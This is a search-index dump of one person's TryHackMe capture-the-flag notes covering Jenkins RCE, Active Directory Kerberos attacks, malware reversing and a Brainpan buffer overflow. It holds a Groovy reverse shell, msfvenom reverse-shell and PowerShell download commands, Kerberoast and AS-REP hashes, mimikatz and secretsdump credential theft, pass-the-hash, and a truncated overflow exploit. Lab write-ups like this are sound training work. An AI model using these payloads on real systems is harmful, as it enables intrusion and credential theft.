{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"index.md/","title":"TryHackMe Raw Notes","text":"<p>Profile:</p> <p>https://tryhackme.com/p/sp00fexpl01t</p> <p>Use Obsidian for the responsiveness.  OR use obsidian-export to export the Obsidian Vault/Notes to regular markdown files.</p> <p>Have maintained all Hack The Box writeups of challenges which I solved and machine I hacked but are private due to their rules.</p> <p>Ping me if you need help.</p>"},{"location":"Alfred/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.6.89   \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-27 15:28 IST\nNmap scan report for 10.10.6.89\nHost is up (0.14s latency).\nNot shown: 997 filtered ports\nPORT     STATE SERVICE            VERSION\n80/tcp   open  http               Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: Site doesn't have a title (text/html).\n3389/tcp open  ssl/ms-wbt-server?\n| ssl-cert: Subject: commonName=alfred\n| Not valid before: 2021-05-26T09:57:29\n|_Not valid after:  2021-11-25T09:57:29\n|_ssl-date: 2021-05-27T09:59:01+00:00; 0s from scanner time.\n8080/tcp open  http               Jetty 9.4.z-SNAPSHOT\n| http-robots.txt: 1 disallowed entry \n|_/\n|_http-server-header: Jetty(9.4.z-SNAPSHOT)\n|_http-title: Site doesn't have a title (text/html;charset=utf-8).\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 25.22 seconds\n</code></pre>"},{"location":"Alfred/02-web/","title":"02 web","text":""},{"location":"Alfred/02-web/#port-80","title":"port 80","text":""},{"location":"Alfred/02-web/#port-8080","title":"port 8080","text":"<p>creds : <code>admin:admin</code></p> <p></p>"},{"location":"Alfred/03-Exploit/","title":"03 Exploit","text":""},{"location":"Alfred/03-Exploit/#jenkins-rce","title":"jenkins RCE","text":"<p>from the Manage section we can execute arbitrary code via script console</p> <p></p> <p>And we have to write a groovy script to get rev shell </p> <p>from this repo we get the script </p> <p>https://github.com/gquere/pwn_jenkins </p> <p>but its for linux box so using rev shell from </p> <p>https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</p> <pre><code>String host=\"10.17.4.208\";\nint port=9001;\nString cmd=\"cmd.exe\";\nProcess p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();\n</code></pre> <p>execute it</p> <p></p> <p>and we got the shell </p> <p></p> <p>got user</p> <p></p> <p>user === 79007a09481963edf2e1321abd9ae2a0</p>"},{"location":"Alfred/04-shell%20change/","title":"04 shell change","text":"<p>we will now change the shell to the mterpreter shell</p> <p><code>msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.17.4.208 LPORT=9001 -f exe -o rev.exe</code></p> <p></p> <p>and transfer and start a listener and run</p> <pre><code>powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://10.17.4.208/rev.exe','C:\\Users\\bruce\\desktop\\rev.exe')\"\n</code></pre> <p></p>"},{"location":"Alfred/05-Root/","title":"05 Root","text":"<p>running whoami/priv we see that we have <code>SeImpersonatePrivilege</code> and <code>SeDebugPrivilege</code> enabled so we will exploit them.</p> <p>for this load the incognito module</p> <p></p> <p>running <code>list tokens -g</code></p> <p></p> <p>running <code>impersonate_token \"BUILTIN\\Administrators\"</code> </p> <p>migrating to NT Authority</p> <p></p> <p></p> <p>root == dff0f748678f280250f25a45b8046b4a</p>"},{"location":"Attacking%20Kerberos/attackingkerberos/","title":"Attackingkerberos","text":"<p>binary from  https://github.com/ropnop/kerbrute/releases</p> <p>wordlist from https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt</p> <p>kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt</p> <p></p> <p>https://github.com/GhostPack/Rubeus</p> <p><code>Rubeus.exe harvest /interval:30</code></p> <p></p> <p><code>echo 10.10.237.129 CONTROLLER.local &gt;&gt; C:\\Windows\\System32\\drivers\\etc\\hosts</code></p> <p><code>Rubeus.exe brute /password:Password1 /noticket</code></p> <p></p> <p><code>Rubeus.exe kerberoast</code></p> <p></p> <p><code>impacket-GetUserSPNs controller.local/Machine1:Password1 -dc-ip 10.10.237.129 -request</code></p> <p></p> <p>HASHES <code>$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$33ea6b553ef9c26b2b05a0eaaa258d27$51b05c5727d8ed64c07c3652765a553dccc14388b8375313070a2f5e323e0f1242abe4c0bae85115e4c5bca5ad64ef62a97e29a12ee23449215c38d85fdf7874c5d6a0fd1fd0a95f65eb2c0b15638743870ae1c1a95b4578b6423d38a170c0703b9fe6d55b119ffad525a2b092511332c412e17459f99b4b635c7d99aaa290667c2b397b874647663ddd6ad249fb7d11c7e7ff4d6fbdbe97b485a388631d8aabf25470941cc7bd3956f7cb14ad8ef9a19ee33dd84580664735d3135035972c6e6a05e774f47b210c348d9c12df5056add7b70feb5d705e3169cdada755bbb17f0f92a90900241d22470d7d67fcbd912b50c6298952dd06158f669398879a70d6573c9ab2c623e962466b27a0dc0bc3892b1664177bccf1c6b39c4a38c21d4539f0a502ffdbde77021aa8f053447afdffbdedcd459ab1fb859642238566a13a454a9dd752015901fabacbb6bb1894f5b033020200d1ad089ce06cce33efa6ecae5bcafda763939c39fd7b236ac7907a5c59b9609b9fb769138a4e65504622c052e74016804cc810681fb64eee38547fa03f6593db212e58af930ff34b1f3dfc6376028771287ab76a6ecdd900b69491874176c222eb1a6fe399a62aba20fcc40b2f3413537bd70e1393c6b6ee7f8f137c794f65f3e35dadedef69ad7bf167da6b941917b9886b0dc8b9f2230aac500c37aff289fb0ef9872aafcf4e7b13ac8fed6db0464d0595929e350b69df3bbfd11d40964b5eea2c94fb90d452c182f97307ce2edfaaf730a4c5a1108c8cc79a00ed3bf63380ecdf181d75374e66085d36e2179560038627c02f6302ddee670c7bf7054bee1c5753727e52d6e64e72f1b9ea75deef68429b2992e9ffdf816be182b980ce6813f99994e9c49f603b7a42c69e452d1b300a49c8ebd0617be4d5af2f9cace89c44f390cb6d0010497189cc2ab9306f0a38e146cf560cfe627839304e335e069e3399b9792b33aca19d0b5ccebbaf104c3ff6e8fc6fa924c404d98a66d9dddc0ffeec57d2aa444feaf031aea6d3fb13c5b630ca1e37608606f197efc78e05af7cbc8900b444fe0144c9d8d4fb0b07db742a9306b888dcfd6c85471746d236c11ea5c69c6f3db83eecca6799dd6a6e7d5a712f6a6a2470f0835255ada584ce6a723fb71f81e845405f3c68c54931cd90d38539f5468020e7a47cc7a83be3e7421c28182c60941a8bc41375f0057fa53226f3ddb8bf2e1422884446b558cb7b2fb487a4077ee0feaf15f27a10e842700ce6b6de27b806e8ede12144c9feaa70c18b1fbcb4dd133a58db8f0303f7a55bcb36cde7487b718d2e5324cbac025400446b76ed9add269ffda14b0ece50312e8c23e6a5f4a6338c15ae5254bf8a32af</code></p> <p></p> <p><code>$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$33ea6b553ef9c26b2b05a0eaaa258d27$51b05c5727d8ed64c07c3652765a553dccc14388b8375313070a2f5e323e0f1242abe4c0bae85115e4c5bca5ad64ef62a97e29a12ee23449215c38d85fdf7874c5d6a0fd1fd0a95f65eb2c0b15638743870ae1c1a95b4578b6423d38a170c0703b9fe6d55b119ffad525a2b092511332c412e17459f99b4b635c7d99aaa290667c2b397b874647663ddd6ad249fb7d11c7e7ff4d6fbdbe97b485a388631d8aabf25470941cc7bd3956f7cb14ad8ef9a19ee33dd84580664735d3135035972c6e6a05e774f47b210c348d9c12df5056add7b70feb5d705e3169cdada755bbb17f0f92a90900241d22470d7d67fcbd912b50c6298952dd06158f669398879a70d6573c9ab2c623e962466b27a0dc0bc3892b1664177bccf1c6b39c4a38c21d4539f0a502ffdbde77021aa8f053447afdffbdedcd459ab1fb859642238566a13a454a9dd752015901fabacbb6bb1894f5b033020200d1ad089ce06cce33efa6ecae5bcafda763939c39fd7b236ac7907a5c59b9609b9fb769138a4e65504622c052e74016804cc810681fb64eee38547fa03f6593db212e58af930ff34b1f3dfc6376028771287ab76a6ecdd900b69491874176c222eb1a6fe399a62aba20fcc40b2f3413537bd70e1393c6b6ee7f8f137c794f65f3e35dadedef69ad7bf167da6b941917b9886b0dc8b9f2230aac500c37aff289fb0ef9872aafcf4e7b13ac8fed6db0464d0595929e350b69df3bbfd11d40964b5eea2c94fb90d452c182f97307ce2edfaaf730a4c5a1108c8cc79a00ed3bf63380ecdf181d75374e66085d36e2179560038627c02f6302ddee670c7bf7054bee1c5753727e52d6e64e72f1b9ea75deef68429b2992e9ffdf816be182b980ce6813f99994e9c49f603b7a42c69e452d1b300a49c8ebd0617be4d5af2f9cace89c44f390cb6d0010497189cc2ab9306f0a38e146cf560cfe627839304e335e069e3399b9792b33aca19d0b5ccebbaf104c3ff6e8fc6fa924c404d98a66d9dddc0ffeec57d2aa444feaf031aea6d3fb13c5b630ca1e37608606f197efc78e05af7cbc8900b444fe0144c9d8d4fb0b07db742a9306b888dcfd6c85471746d236c11ea5c69c6f3db83eecca6799dd6a6e7d5a712f6a6a2470f0835255ada584ce6a723fb71f81e845405f3c68c54931cd90d38539f5468020e7a47cc7a83be3e7421c28182c60941a8bc41375f0057fa53226f3ddb8bf2e1422884446b558cb7b2fb487a4077ee0feaf15f27a10e842700ce6b6de27b806e8ede12144c9feaa70c18b1fbcb4dd133a58db8f0303f7a55bcb36cde7487b718d2e5324cbac025400446b76ed9add269ffda14b0ece50312e8c23e6a5f4a6338c15ae5254bf8a32af</code></p> <p></p> <p><code>Rubeus.exe asreproast</code></p> <p></p> <p><code>23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User.....</code> <code>hashcat -m 18200 hash Pass.txt</code></p> <p><code>$krb5asrep$23$User3@CONTROLLER.local:1B7EEB786F8905743BB506B3600E0058$492EF2C1C19E28646A04D5FCB6E883A0278F100D5EF88EC00364F9B1754560C37CB7DDCA10D977F71FC904B477B6F32F2D1A628C6EBD56B1F7F9A24ABE7EA8E259A9A60AA86C647BCE0E9B4193FD2BB2F5DCBED9FCD4F6364A53090D90E4228C0EF4A3C243F48B54E9B7E0B3E0BF4C5B203F150E34955B766175A81DD0EFC68552E65EFF3F116C44E39D0F8DFCD6C5EBFF9914FF5C9D048E29CBD5E7B344A2B10D871A3F312026D54C97251B728743C9061E848AA17173D353701FC52905AE462339D6A3828C173B3705635836812B8C56E65DDC3ECD075AE20617729CAA1B5224945E280680FACB55B49217BCA62700751A3569</code></p> <p><code>$krb5asrep$23$Admin2@CONTROLLER.local:D180449159203FE62E70B7A10A063305$2D1EB86F1FC0A7BF980C6A020952EB28ABE95A0908613D520C004B41EB65D66FDD77D07D0F9E801098DD31F6C55F8412B12D77753627847CA528B0A3103714EF7D035FFD922381ABC482A95A279771E841C7A3DE8B103BBB23526825BE4D2CAACF6F11181E0F4F938CAD3E76D3CB2B05781F1DD6D8D6904DE29FEE43A25C445B6349F167D8BE2F0A8A253A21BA2DC3562D6AA2D47F3BA8383EC7FC4B58CA4E372E7EEE2C6CC3BF356FF5D824DDAC0DAA5EAEFA68C191DA8F6B91C8E767A4B293459D7E9FF4F30D21765CAD7C14845724F650ED277EEE878C15C18F74412041FEDBFBE6C76145359B8437E5D63EDE0B9F5C0F650C</code></p> <p></p> <p></p> <p><code>kerberos::ptt [0;2d5389]-2-0-60a10000-CONTROLLER-1$@krbtgt-CONTROLLER.LOCAL.kirbi</code></p> <p></p> <p><code>lsadump::lsa /inject /name:krbtgt</code></p> <p></p> <p><code>lsadump::lsa /inject /name:sqlservice</code></p> <p></p> <p><code>lsadump::lsa /inject /name:Administrator</code></p> <p></p>"},{"location":"AttacktiveDirect/00-creds/","title":"00 creds","text":"<p><code>svc-admin@spookysec.local:management2005</code></p> <p><code>backup@spookysec.local:backup2517860</code></p>"},{"location":"AttacktiveDirect/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.121.26\nStarting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 15:16 IST\nNmap scan report for 10.10.121.26\nHost is up (0.14s latency).\nNot shown: 987 closed ports\nPORT     STATE SERVICE       VERSION\n53/tcp   open  domain        Simple DNS Plus\n80/tcp   open  http          Microsoft IIS httpd 10.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/10.0\n|_http-title: IIS Windows Server\n88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-06-01 09:46:47Z)\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  tcpwrapped\n3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local0., Site: Default-First-Site-Name)\n3269/tcp open  tcpwrapped\n3389/tcp open  ms-wbt-server Microsoft Terminal Services\n| rdp-ntlm-info: \n|   Target_Name: THM-AD\n|   NetBIOS_Domain_Name: THM-AD\n|   NetBIOS_Computer_Name: ATTACKTIVEDIREC\n|   DNS_Domain_Name: spookysec.local\n|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local\n|   Product_Version: 10.0.17763\n|_  System_Time: 2021-06-01T09:47:01+00:00\n| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local\n| Not valid before: 2021-05-31T09:45:16\n|_Not valid after:  2021-11-30T09:45:16\n|_ssl-date: 2021-06-01T09:47:10+00:00; +1s from scanner time.\nService Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   2.02: \n|_    Message signing enabled and required\n| smb2-time: \n|   date: 2021-06-01T09:47:04\n|_  start_date: N/A\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 43.28 seconds\n</code></pre>"},{"location":"AttacktiveDirect/03-smb/","title":"03 smb","text":"<pre><code>\u2514\u2500$ enum4linux 10.10.121.26                                                                                    127 \u2a2f\nStarting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Jun  1 15:20:26 2021\n\n ========================== \n|    Target Information    |\n ========================== \nTarget ........... 10.10.121.26\nRID Range ........ 500-550,1000-1050\nUsername ......... ''\nPassword ......... ''\nKnown Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none\n\n\n ==================================================== \n|    Enumerating Workgroup/Domain on 10.10.121.26    |\n ==================================================== \n[E] Can't find workgroup/domain\n\n\n ============================================ \n|    Nbtstat Information for 10.10.121.26    |\n ============================================ \nLooking up status of 10.10.121.26\nNo reply from 10.10.121.26\n\n ===================================== \n|    Session Check on 10.10.121.26    |\n ===================================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.\n[+] Server 10.10.121.26 allows sessions using username '', password ''\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.\n[+] Got domain/workgroup name: \n\n =========================================== \n|    Getting domain SID for 10.10.121.26    |\n =========================================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.\nDomain Name: THM-AD\nDomain Sid: S-1-5-21-3591857110-2884097990-301047963\n[+] Host is part of a domain (not a workgroup)\n\n ====================================== \n|    OS information on 10.10.121.26    |\n ====================================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.\nUse of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.\n[+] Got OS info for 10.10.121.26 from smbclient: \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.\n[+] Got OS info for 10.10.121.26 from srvinfo:\nCould not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED\n\n ============================= \n|    Users on 10.10.121.26    |\n ============================= \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.\n[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED\n\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.\n[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED\n\n ========================================= \n|    Share Enumeration on 10.10.121.26    |\n ========================================= \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.\n\n        Sharename       Type      Comment\n        ---------       ----      -------\nSMB1 disabled -- no workgroup available\n\n[+] Attempting to map shares on 10.10.121.26\n\n ==================================================== \n|    Password Policy Information for 10.10.121.26    |\n ==================================================== \n[E] Unexpected error from polenum:\n\n\n[+] Attaching to 10.10.121.26 using a NULL share\n\n[+] Trying protocol 139/SMB...\n\n        [!] Protocol failed: Cannot request session (Called Name:10.10.121.26)\n\n[+] Trying protocol 445/SMB...\n\n        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.\n\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.\n\n[E] Failed to get password policy with rpcclient\n\n\n ============================== \n|    Groups on 10.10.121.26    |\n ============================== \nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.\n\n[+] Getting builtin groups:\n\n[+] Getting builtin group memberships:\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.\n\n[+] Getting local groups:\n\n[+] Getting local group memberships:\nUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.\n\n[+] Getting domain groups:\n\n[+] Getting domain group memberships:\n\n</code></pre> <p><code>smbclient -U spookysec.local/svc-admin -L //10.10.121.26</code></p> <p></p> <p><code>smbclient -U spookysec.local/svc-admin  //10.10.121.26/backup</code></p> <p></p> <p></p> <p><code>backup@spookysec.local:backup2517860</code></p>"},{"location":"AttacktiveDirect/04-foothold/","title":"04 foothold","text":"<p><code>/opt/binaries/kerbrute/kerbrute userenum --dc spookysec.local -d spookysec.local /usr/share/wordlists/active-directory/userlist.txt -t 50</code></p> <p></p> <p><code>impacket-GetNPUsers spookysec.local/svc-admin -no-pass -dc-ip  10.10.121.26 -request</code></p> <p><code>$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:8816586eb4d93a693f150aed21b3646f$563ab87b5523728012c15b78104b2ad6f21c4cdc7db1b0a1f552d4914c450e88e4caed69c182e7a0a55e00e51e62993c4abfd5516032dc134f3b28bfb2f0c7ae8300f427e8b8eb49b02204b9fa159abfd6d77245eb040b6a2ffd481777c77d42a80fea107f1133e55d43400cfc7e7d19d3466344a9049d3beff93b766ace644ca9901b0f83d9a1203e7c3d2b6820dfa1aed348c172661f22b2ba5987f432c0ab3e8e41f2e2661e6e6b679f19aa3b6c39e27d1f4a1ba560e2043be5d47a88a2c12f8a256b9351624ce1894bf523664e28e02a70f023a215b8da060d91c48a1f20eeb5f667ed7666143e3d8df801fd7ef61552</code></p> <p></p> <p></p> <p><code>hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt</code> <code>management2005</code> </p>"},{"location":"AttacktiveDirect/05-root/","title":"05 root","text":"<p><code>impacket-secretsdump -dc-ip 10.10.121.26 spookysec.local/backup:backup2517860@10.10.121.26</code></p> <p></p> <p><code>evil-winrm -u administrator -H 0e0363213e37b94221497260b0bcb4fc -i 10.10.121.26</code></p> <p></p> <p>svc-admin : TryHackMe{K3rb3r0s_Pr3_4uth}</p> <p></p> <p>backup: TryHackMe{B4ckM3UpSc0tty!}</p> <p> Administrator: TryHackMe{4ctiveD1rectoryM4st3r}</p>"},{"location":"Basic%20Malware%20RE/Basic%20Malware%20RE/","title":"Basic Malware RE","text":"<p>unzip the files with <code>7z x -pMalwareTech file.zip</code></p> <p></p> <p>using IDA to disassemble </p> <p></p> <p>2nd binary  </p> <p>FLAG{STACK-STRING-ARE-BEST-STRINGS}</p> <p></p> <p></p> <p>FLAG{RESOURCES-ARE-POPULAR-FOR-MALWARE}</p>"},{"location":"Binary%20Heaven/binaryheaven/","title":"Binary Heaven","text":"<p>We are given the 2 binaries, from angel_A we get the username</p>"},{"location":"Binary%20Heaven/binaryheaven/#username","title":"username","text":"<p>import into ghidra and get the username raw bytes  </p> <pre><code>6b 79 6d 7e 68 75 6d 72\n</code></pre> <p>now in the main function, calculations are done to get the alphabets</p> <p><code>username[i] = (entered[i]^4)+8</code> now modifiying to get the entered values:</p> <p><code>(entered[i]-8)^4 = entered[i]</code></p> <p>and printing the chars for the decimals using the eqns</p> <pre><code>a = [0x6b, 0x79, 0x6d, 0x7e, 0x68, 0x75, 0x6d, 0x72]\n\nfor i in a:\n    print(chr((i-8)^4), end=\"\")\n</code></pre> <p>and prints <code>guardian</code></p>"},{"location":"Brainpan%201/01-nmap/","title":"01 nmap","text":"<pre><code>\u2514\u2500$ nmap -sC -sV -oN nmap 10.10.49.32  \nStarting Nmap 7.91 ( https://nmap.org ) at 2021-05-31 15:07 IST\nNmap scan report for 10.10.49.32\nHost is up (0.13s latency).\nNot shown: 998 closed ports\nPORT      STATE SERVICE VERSION\n9999/tcp  open  abyss?\n| fingerprint-strings: \n|   NULL: \n|     _| _| \n|     _|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| \n|     _|_| _| _| _| _| _| _| _| _| _| _| _|\n|     _|_|_| _| _|_|_| _| _| _| _|_|_| _|_|_| _| _|\n|     [________________________ WELCOME TO BRAINPAN _________________________]\n|_    ENTER THE PASSWORD\n10000/tcp open  http    SimpleHTTPServer 0.6 (Python 2.7.3)\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port9999-TCP:V=7.91%I=7%D=5/31%Time=60B4AE8E%P=x86_64-pc-linux-gnu%r(NU\nSF:LL,298,\"_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\n_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\nSF:\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\\nSF:x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\n_\\|\\x20\\x20\\x20\\x20_\\|\\x\nSF:20\\x20_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x\nSF:20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x\nSF:20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|\\x20\\x20\\x20\\x20_\\|\nSF:\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x\nSF:20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x\nSF:20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n_\\|_\\|_\\|\\x20\\x\nSF:20\\x20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20_\\|_\\|_\\|\\x20\\x20_\nSF:\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\x20\\x20_\\|_\\|_\\|\\x20\\x20\\x20\\x20\\x20\\x\nSF:20_\\|_\\|_\\|\\x20\\x20_\\|\\x20\\x20\\x20\\x20_\\|\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20_\\|\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x2\nSF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\\nSF:x20\\x20_\\|\\n\\n\\[________________________\\x20WELCOME\\x20TO\\x20BRAINPAN\\x\nSF:20_________________________\\]\\n\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20ENTER\\x\nSF:20THE\\x20PASSWORD\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x\nSF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\n\\n\\\nSF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\nSF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20&gt;&gt;\\x20\");\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 74.42 seconds\n</code></pre>"},{"location":"Brainpan%201/02-web/","title":"02 web","text":""},{"location":"Brainpan%201/02-web/#port-10000","title":"port 10000","text":""},{"location":"Brainpan%201/02-web/#fuzzing","title":"fuzzing","text":""},{"location":"Brainpan%201/03-foothold/","title":"03 foothold","text":""},{"location":"Brainpan%201/03-foothold/#port-9999","title":"port 9999","text":"<p>interaction with the binary </p> <p></p>"},{"location":"Brainpan%201/03-foothold/#bof","title":"bof","text":""},{"location":"Brainpan%201/03-foothold/#fuzzing","title":"fuzzing","text":"<p>crashed at 700 bytes</p> <p></p> <pre><code>#!/usr/bin/env python3\n\nimport socket, time, sys\n\nip = \"192.168.1.108\"\n\nport = 9999\ntimeout = 5\nprefix = \"\"\n\nstring = prefix + \"A\" * 100\n\nwhile True:\n  try:\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n      s.settimeout(timeout)\n      s.connect((ip, port))\n      #s.recv(1024)\n      print(\"Fuzzing with {} bytes\".format(len(string) - len(prefix)))\n      s.send(bytes(string + \"\\r\\n\", \"latin-1\"))\n      s.recv(1024)\n  except:\n    print(\"Fuzzing crashed at {} bytes\".format(len(string) - len(prefix)))\n    sys.exit(0)\n  string += 100 * \"A\"\n  time.sleep(1)\n</code></pre>"},{"location":"Brainpan%201/03-foothold/#offset","title":"offset","text":"<p>EIP: 35724134</p> <p>offset: 524</p> <p></p> <p></p>"},{"location":"Brainpan%201/03-foothold/#bad-chars","title":"bad chars","text":"<p>ESP: 005FF910</p> <p></p> <p>bad chars: <code>\\x00</code></p>"},{"location":"Brainpan%201/03-foothold/#jmp-point","title":"jmp point","text":"<p>311712F3</p> <p>little endian </p> <p><code>\\xf3\\x12\\x17\\x31</code></p> <p></p>"},{"location":"Brainpan%201/03-foothold/#exploit","title":"exploit","text":"<p><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.17.4.208 LPORT=9001 EXITFUNC=thread -f c -a x86 --platform windows -b \"\\x00\"</code></p> <p></p> <pre><code>import socket\n\nip = \"10.10.48.192\"\nport = 9999\n\nprefix = \"\"\noffset = 524\noverflow = \"A\" * offset\nretn = \"\\xf3\\x12\\x17\\x31\"\npadding = \"\\x90\" * 16\npayload = 